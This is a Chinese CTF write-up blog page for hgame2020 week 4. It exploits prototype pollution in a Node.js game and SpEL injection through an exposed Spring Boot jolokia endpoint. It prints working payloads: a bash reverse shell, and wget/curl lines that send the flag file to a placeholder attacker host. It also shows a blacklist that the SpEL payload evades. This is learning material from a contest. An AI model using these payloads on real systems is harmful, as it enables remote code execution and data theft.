@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        hgame2020week4_wp - 9un&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> null </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>路人</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sekiro"><span class="toc-text">sekiro</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#赛后"><span class="toc-text">赛后</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezJava"><span class="toc-text">ezJava</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> null </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        hgame2020week4_wp
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2020-02-18 22:33:16</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#vidar" title="vidar">vidar</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>感谢各位出题人的耐心解答！</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h2><p>题目提供了源码，结构是这样的<br><img src="wp4_img/0sekiro.png" alt=""><br>看起来应该是要读取flag中的内容<br>先看web\routes\index.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从<a href="https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">浅析JavaScript原型链污染攻击</a> 可以得知源码中的merge和clone会触发原型链污染<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">"Session required."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">"You dead."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">  <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">  <span class="keyword">if</span> (copybody.solution) &#123;</span><br><span class="line">    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(<span class="string">"提交成功"</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>发现此处调用了clone函数,在solution存在的情况下会调用Game.dealWithAttacks()，再在\web\utils查看具体内容<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.dealWithAttacks = <span class="function"><span class="keyword">function</span> (<span class="params">sekiro, solution</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sekiro.attackInfo.solution !== solution) &#123;</span><br><span class="line">            sekiro.health -= sekiro.attackInfo.attack</span><br><span class="line">            <span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">                <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sekiro.posture = (sekiro.posture &lt;= <span class="number">500</span>) ? sekiro.posture : <span class="number">500</span></span><br><span class="line">        sekiro.health = (sekiro.health &gt; <span class="number">0</span>) ? sekiro.health : <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (sekiro.posture == <span class="number">500</span> || sekiro.health == <span class="number">0</span>) &#123;</span><br><span class="line">            sekiro.alive = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sekiro</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br></pre></td></tr></table></figure></p>
+<p>可以通过改变sekiro.attackInfo.additionalEffect的值，在调用fn时实现远程命令执行<br>可以发现条件是 sekiro.attackInfo.solution !== solution<br>而在attack中<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.attacks = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"连续砍击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=100"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"连续格挡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"普通攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=50"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"格挡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"下段攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"跳跃踩头"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"突刺攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"识破"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"巴之雷"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"雷反"</span></span><br><span class="line">        &#125;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure></p>
+<p>通过原型链污染的条件，我们要在攻击没有additionalEffect属性时发送我们的payload<br>说实话不知道为啥老是接收不到数据…<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"solution"</span>:<span class="number">0</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"additionalEffect"</span>: <span class="string">"return e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/_ip/_port 0&gt;&amp;1\"')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"solution"</span>:<span class="number">0</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"additionalEffect"</span>:<span class="string">" return e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;global.process.mainModule.constructor._load('child_process').exec('wget _ip/_port?$(cat /flag|base64)'.function()&#123;&#125;)"</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这俩我都失败了，但是学长试了第二个说是可以拿到flag的?感觉是我操作问题…<br>后来利用curl来执行命令终于成功了一次…<br>payload成功变成了这样<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"solution"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"__proto__"</span>:&#123;</span><br><span class="line">        <span class="string">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process').execSync('curl http://_ip:_apache_port/?flag=`cat ../../../flag|base64`')"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先访问/info /attack界面，确定攻击满足条件后，再post /action，发送payload，最后从apache日志里找access记录<br>但是这个对我来说也是看运气，试了N遍就成功了一次…后面再尝试的时候又收不到了…  </p>
+<h1 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="ezJava"><a href="#ezJava" class="headerlink" title="ezJava"></a>ezJava</h3><p>嘛…这道题是出题人手把手教的= =然而直到比赛结束才搞懂，现在写一点点好了<br>出题人一开始给了俩网址提示<br><a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">Code-Breaking Puzzles — javacon WriteUp</a><br><a href="https://jolokia.org/reference/html/protocol.html" target="_blank" rel="noopener">jolokia</a><br>再结合下题目<br><img src="wp4_img/5.png" alt=""><br>打开是一个登录表单<br><img src="wp4_img/1.png" alt=""><br>先猜一下username=admin，password=admin，正好是正确的<br><a href="https://www.jianshu.com/p/af9738634a21" target="_blank" rel="noopener">Spring Boot Actuator 使用</a><br><a href="https://www.anquanke.com/post/id/173262" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 1</a><br>根据上面这两篇文章以及提示，我们访问<br><a href="http://ezspel.hgame.wz22.cc/actuator/env" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/actuator/env</a><br>正好看见application.yml<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"applicationConfig: [classpath:/application.yml]"</span>,</span><br><span class="line">            <span class="string">"properties"</span>: &#123;</span><br><span class="line">                <span class="string">"server.port"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="number">9997</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:2:9"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"spring.application.name"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"ezSpel"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:6:7"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"management.endpoint.shutdown.enabled"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: false,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:10:16"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"management.endpoint.jolokia.config.debug"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: true,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:13:16"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"management.endpoints.web.exposure.include"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"info,jolokia,env"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:17:18"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"keywords.blacklist[0]"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"java.+lang"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:21:7"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"keywords.blacklist[1]"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"Runtime"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:22:7"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"keywords.blacklist[2]"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"exec.*\\("</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:23:7"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"keywords.blacklist[3]"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"getClass"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:24:7"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"keywords.blacklist[4]"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"forName"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:25:7"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"user.username"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"admin"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:28:13"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"user.password"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"******"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:29:13"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"user.encParam1"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"hgamehgamehgame&#123;"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:30:14"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"user.encParam2"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"spppelandjookiaa"</span>,</span><br><span class="line">                    <span class="string">"origin"</span>: <span class="string">"class path resource [application.yml]:31:14"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"class path resource [application.yml]:class path resource [application.yml]"</span>,</span><br><span class="line">            <span class="string">"properties"</span>: &#123;</span><br><span class="line">                <span class="string">"ezSpel"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"include"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"info,jolokia,env"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"-"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"forName"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"password"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"******"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"web"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"username"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"admin"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"blacklist"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"endpoint"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"endpoints"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"encParam2"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"spppelandjookiaa"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"encParam1"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"hgamehgamehgame&#123;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"application"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"keywords"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"management"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"enabled"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"false"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"port"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"9997"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"spring"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"debug"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">"true"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"shutdown"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"server"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"jolokia"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"exposure"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"config"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"user"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"name"</span>: &#123;</span><br><span class="line">                    <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>由此我们可以知道blacklist和加密解密中的2个参数<br>再访问<br><a href="http://ezspel.hgame.wz22.cc/actuator/jolokia/list" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/actuator/jolokia/list</a><br>我们再来搜一搜出题人的名字(jqy)很容易就找到了关键部分(开玩笑的，一开始是肉眼找的，看见encrypt的字样感觉比较敏感才找到的)<br><img src="wp4_img/2.jpg" alt=""><br>根据出题人提供的两份资料，我们需要构造payload来执行命令读取flag，而加密与解密针对的是rememberMe，所以我们需要在其中替换rememberMe的值<br>先放出payload<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   "type":"EXEC",</span><br><span class="line">   "mbean":"com.jqy.ezspel:Name=EncryptService",</span><br><span class="line">   "operation":"encrypt",</span><br><span class="line">   "arguments":["hgamehgamehgame&#123;","spppelandjookiaa","#&#123;T(ClassLoader).getSystemClassLoader().loadClass(<span class="symbol">\"</span>java.l<span class="symbol">\"</span>+<span class="symbol">\"</span>ang.Ru<span class="symbol">\"</span>+<span class="symbol">\"</span>ntime<span class="symbol">\"</span>).getMethod(<span class="symbol">\"</span>ex<span class="symbol">\"</span>+<span class="symbol">\"</span>ec<span class="symbol">\"</span>,T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(<span class="symbol">\"</span>java.l<span class="symbol">\"</span>+<span class="symbol">\"</span>ang.Ru<span class="symbol">\"</span>+<span class="symbol">\"</span>ntime<span class="symbol">\"</span>).getMethod(<span class="symbol">\"</span>getRu<span class="symbol">\"</span>+<span class="symbol">\"</span>ntime<span class="symbol">\"</span>).invoke(T(ClassLoader).getSystemClassLoader().loadClass(<span class="symbol">\"</span>java.l<span class="symbol">\"</span>+<span class="symbol">\"</span>ang.Ru<span class="symbol">\"</span>+<span class="symbol">\"</span>ntime<span class="symbol">\"</span>)),new String[]&#123;<span class="symbol">\"</span>/bin/bash<span class="symbol">\"</span>,<span class="symbol">\"</span>-c<span class="symbol">\"</span>,<span class="symbol">\"</span>curl http://_yourVPS:_apachePort/?flag=`cat flag`|base64<span class="symbol">\"</span>&#125;)&#125;"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
